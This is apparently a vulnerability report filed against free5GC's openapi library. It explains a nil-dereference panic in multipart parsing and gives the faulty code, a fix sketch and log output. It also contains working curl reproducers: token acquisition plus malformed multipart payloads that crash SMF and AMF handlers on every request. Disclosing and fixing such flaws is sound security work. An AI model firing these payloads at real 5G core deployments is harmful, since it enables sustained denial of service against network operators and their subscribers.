items.title: [Bugs] MultiNF openapi MultipartDeserialize nil dereference, causing DoS
items.body:
## Description

`github.com/free5gc/openapi@v1.2.3` can be driven into a panic in `MultipartDeserialize` (`client.go:608`) when malformed `multipart/related` input makes `multipart.Reader.NextPart()` return a non-EOF error. The loop handles only `io.EOF`; other errors fall through into code that assumes `part != nil`, causing a nil pointer dereference.

Offending code in `client.go` around line 600–615:

```go
for {
    var part, nextPart *multipart.Part
    multipartBody := make([]byte, 1400)

    if nextPart, err = r.NextPart(); err == io.EOF {   // only EOF handled
        break
    } else {
        part = nextPart                                // err != nil → part == nil
    }

    contentType := part.Header.Get("Content-Type")     // <- panic here
    var n int
    n, err = part.Read(multipartBody)
    if err == nil {                                    // logic inversion: returns
        return err                                     // nil on success, swallows
    }                                                  // real read errors
    ...
}
```

Two defects sit together:

1. **Missing `err != nil` branch after `NextPart`.** Any parse failure in the underlying `multipart.Reader` (malformed boundary, boundary not found, premature EOF inside a part, oversized line, etc.) causes `NextPart` to return `(nil, err)` where `err` is **not** `io.EOF`. The `else` branch assigns `part = nil` and the very next line, `part.Header.Get("Content-Type")`, panics.
2. **Inverted error check on `part.Read`**: `if err == nil { return err }` returns `nil` on success (terminating the deserialization early) and silently ignores real read errors. This is the opposite of the intended semantics.

Gin's recovery middleware catches the panic so the process does not exit, but every malformed request produces a full goroutine unwind plus a stack trace in the log. The returned HTTP response is `500` with an empty body (no `ProblemDetails`), which violates TS 29.500 §5.2.7.

**Blast radius**: because this is in the shared `free5gc/openapi` library, every NF whose handlers go through `MultipartRelatedBinding.Bind` is affected. Confirmed on v4.2.2:

- SMF: `HTTPPostSmContexts` (`api_pdusession.go:103`), `HTTPUpdateSmContext` (`:151`), `HTTPReleaseSmContext` (`:179`).
- AMF: `HTTPCreateUEContext`, `HTTPN1N2MessageTransfer`.

Other NFs that accept `multipart/related` (e.g. NEF, PCF) use the same binding and should be reviewed.

**Severity**: the endpoint is behind OAuth2 so an attacker needs a valid access token. With a token, a single attacker sustains ≥300 panics/sec from one HTTP client in our tests, producing unbounded log volume and goroutine churn. The panic is 100 % reproducible on every request with any of the three minimal payloads below.

## To Reproduce

Three minimal payloads, all triggering the exact same panic at `client.go:608`. The only thing that varies is how `multipart.Reader.NextPart()` fails — everything downstream is identical.

### Step 1 — obtain a valid NF access token

Register a test NF at the NRF and request a `SMF` scope token (standard TS 33.501 §13.4.1 flow, no mTLS required in the default docker-compose setup):

```bash
NRF=http://<nrf-host>:8000
SMF=http://<smf-host>:8000
NF_ID=11111111-1111-4111-8111-111111111111

curl -X PUT "$NRF/nnrf-nfm/v1/nf-instances/$NF_ID" \
     -H 'Content-Type: application/json' \
     -d "{\"nfInstanceId\":\"$NF_ID\",\"nfType\":\"AMF\",\"nfStatus\":\"REGISTERED\"}"
# → 201

TOKEN=$(curl -s -X POST "$NRF/oauth2/token" \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d "grant_type=client_credentials&nfInstanceId=$NF_ID&nfType=AMF&targetNfType=SMF&scope=nsmf-pdusession" \
   | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
```

### Step 2 — trigger the panic (any one of these three reproducers)

Each one panics on **every single request**. `http` status is 500; `docker logs smf` shows the stack trace below.

**Reproducer A — body has no boundary framing**

```bash
curl -X POST "$SMF/nsmf-pdusession/v1/sm-contexts" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: multipart/related; boundary=B" \
     --data-raw "random garbage without boundary"
# → HTTP/1.1 500, empty body
# SMF log:  panic: runtime error: invalid memory address or nil pointer dereference
```

**Reproducer B — oversized boundary parameter (≥64 KB)**

```bash
BOUND=$(python3 -c "print('A'*65000)")
curl -X POST "$SMF/nsmf-pdusession/v1/sm-contexts" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: multipart/related; boundary=$BOUND" \
     --data-raw "--${BOUND}\r\nContent-Type: application/json\r\n\r\n{}\r\n--${BOUND}--"
# → HTTP/1.1 500, empty body, same panic
```

**Reproducer C — empty body**

```bash
curl -X POST "$SMF/nsmf-pdusession/v1/sm-contexts" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: multipart/related; boundary=B" \
     --data-raw ""
# → HTTP/1.1 500, empty body, same panic
```

### Step 3 — confirm the same panic on other endpoints / other NFs

Replace the URL with any other multipart endpoint; the same payloads trigger identical panics:

```bash
# SMF UpdateSmContext
$SMF/nsmf-pdusession/v1/sm-contexts/<ref>/modify

# SMF ReleaseSmContext
$SMF/nsmf-pdusession/v1/sm-contexts/<ref>/release

# AMF CreateUEContext
$AMF/namf-comm/v1/ue-contexts/<supi>

# AMF N1N2MessageTransfer
$AMF/namf-comm/v1/ue-contexts/<supi>/n1-n2-messages
```

## Expected Behavior

A malformed `multipart/related` request should be rejected with HTTP **400 Bad Request** (or **415 Unsupported Media Type` when the Content-Type itself is malformed) and a TS 29.500 §5.2.7 `ProblemDetails` body. The NF handler must not panic.

Concretely, in `openapi.MultipartDeserialize`:

1. Any non-nil `err` from `r.NextPart()` should be returned to the caller, not silently absorbed.
2. `part` must be nil-checked before use (defensive, in case future refactors regress).
3. `if err == nil { return err }` after `part.Read` should be `if err != nil && err != io.EOF { return err }`.

Sketch of the minimal fix:

```go
for {
    part, err := r.NextPart()
    if errors.Is(err, io.EOF) {
        break
    }
    if err != nil {
        return fmt.Errorf("multipart parse: %w", err)
    }
    if part == nil {
        return fmt.Errorf("multipart parse: NextPart returned nil part without error")
    }

    contentType := part.Header.Get("Content-Type")

    multipartBody := make([]byte, 1400)
    n, err := part.Read(multipartBody)
    if err != nil && !errors.Is(err, io.EOF) {
        return fmt.Errorf("multipart read: %w", err)
    }
    multipartBody = multipartBody[:n]
    // ...
}
```

A complementary hardening is to cap the accepted `boundary` parameter length in the Content-Type header (Go's `mime/multipart` will happily try to read a 64 KB boundary before giving up).

## Environment

- free5GC Version: `v4.2.2`
- `github.com/free5gc/openapi`: `v1.2.3`
- `github.com/free5gc/util`: `v1.3.2-0.20260107090449-c09baaf75b11`
- gin-gonic/gin: `v1.10.0`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`

### Log File

Excerpt from `docker logs smf` during Reproducer A (one panic per request, 3 trigger classes × 3 SMF handlers = 9 panics visible; all share the same inner frame at `client.go:608`):

```
[ERRO][SMF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 7398 [running]:
```
